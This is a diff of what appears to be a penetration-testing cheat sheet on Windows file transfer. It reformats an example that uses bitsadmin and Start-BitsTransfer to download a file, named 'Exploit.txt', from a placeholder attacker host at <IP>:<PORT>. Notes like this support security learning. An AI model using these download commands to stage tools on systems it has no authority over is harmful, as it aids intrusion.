@@ -116,11 +116,11 @@ Also we can use MD5 hash by using `md5sum` command to validate the file from com
 
 Medhod-5: Download and Upload files to Windows Machine using BITSAdmin
 
-<pre class="language-powershell"><code class="lang-powershell">bitsadmin /transfer &#x3C;filename> http://&#x3C;IP>:&#x3C;PORT>/&#x3C;filename> &#x3C;upload_location>
-<strong>
-</strong><strong>## → For downloading a file from a remote server to the local system using BITS (Background Intelligent Transfer Service).
-</strong>
-</code></pre>
+```powershell
+bitsadmin /transfer <filename> http://<IP>:<PORT>/<filename> <upload_location>
+## → For downloading a file from a remote server to the local system using BITS (Background Intelligent Transfer Service).
+
+```
 
 ```powershell
 Start-BitsTransfer -Source "http://<IP>:<PORT>/<filename>" -Destination "$env:USERPROFILE\Downloads\Exploit.txt"
